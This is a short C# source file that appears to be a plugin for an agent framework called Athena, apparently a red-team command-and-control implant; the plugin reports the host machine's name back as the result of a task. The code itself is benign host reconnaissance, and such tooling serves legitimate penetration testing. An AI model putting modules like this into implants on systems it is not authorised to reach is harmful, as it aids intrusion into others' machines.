using Athena.Plugins;
using System;
using System.Collections.Generic;
using System.Net;
namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override string Name => "hostname";
        public override void Execute(Dictionary<string, object> args)
        {
            PluginHandler.AddResponse(new ResponseResult
            {
                completed = "true",
                user_output = Dns.GetHostName(),
                task_id = (string)args["task-id"],
            });
        }
    }
}
